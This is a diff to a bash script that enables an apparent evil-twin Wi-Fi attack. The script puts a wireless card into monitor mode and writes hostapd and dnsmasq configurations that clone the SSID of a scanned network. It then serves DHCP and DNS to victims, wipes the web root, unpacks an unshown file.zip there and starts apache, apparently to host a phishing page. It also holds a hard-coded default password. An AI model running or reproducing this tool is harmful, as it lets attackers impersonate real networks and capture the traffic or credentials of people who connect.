@@ -13,7 +13,6 @@ username=AP
 userpasswd=password
 
 #colors
-GREEN="\033[0;32m"
 RED="\033[0;31m"
 
 ## Privilege check
@@ -82,47 +81,47 @@ function Wifi_networks_scan()
 ## Setting up an access point
 function AP_set_up()
 {	
-# 	echo "[*] Putting device in monitor mode..."
-# 	airmon-ng start $wireless_interface_name > /dev/null
+	echo "[*] Putting device in monitor mode..."
+	airmon-ng start $wireless_interface_name > /dev/null
 	
-# 	monitor_mode=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)
+	monitor_mode=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)
 
-# 	echo "[*] Creating directory in /root/access_point"
-# 	mkdir /root/access_point
+	echo "[*] Creating directory in /root/access_point"
+	mkdir /root/access_point
 
-# 	echo "[*] Creating hostapd.conf file"
-# 	echo "interface=$monitor_mode
-# driver=nl80211
-# ssid=$selected_network
-# hw_mode=g
-# channel=7
-# macaddr_acl=0
-# ignore_broadcast_ssid=0" > /root/access_point/hostapd.conf
-# 	sleep 1
+	echo "[*] Creating hostapd.conf file"
+	echo "interface=$monitor_mode
+driver=nl80211
+ssid=$selected_network
+hw_mode=g
+channel=7
+macaddr_acl=0
+ignore_broadcast_ssid=0" > /root/access_point/hostapd.conf
+	sleep 1
 
-# 	echo "[*] Creating dnsmasq.conf file"
-# 	echo "interface=$monitor_mode
-# dhcp-range=192.168.0.2,192.168.0.30,255.255.255.0,12h
-# dhcp-option=3,192.168.0.1
-# dhcp-option=6,192.168.0.1
-# server=8.8.8.8
-# log-queries
-# log-dhcp
-# listen-address=127.0.0.1" > /root/access_point/dnsmasq.conf
-# 	sleep 2
+	echo "[*] Creating dnsmasq.conf file"
+	echo "interface=$monitor_mode
+dhcp-range=192.168.0.2,192.168.0.30,255.255.255.0,12h
+dhcp-option=3,192.168.0.1
+dhcp-option=6,192.168.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1" > /root/access_point/dnsmasq.conf
+	sleep 2
 	
-# 	hostapd hostapd.conf
+	hostapd hostapd.conf
 
-# 	ifconfig $monitor_mode up 192.168.0.1 netmask 255.255.255.0
-# 	route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1
+	ifconfig $monitor_mode up 192.168.0.1 netmask 255.255.255.0
+	route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1
 
 
-# 	dnsmasq -C dnsmasq.conf -d 
+	dnsmasq -C dnsmasq.conf -d 
 	
-
 	echo "[*] Unzipping files to /var/www/html"
 	rm -rf /var/www/html/*
-	unzip file.zip -d /var/www/html
+	mv file.zip /root/access_point
+	unzip /root/access_point/file.zip -d /var/www/html
 	sleep 2
 
 	service apache2 start
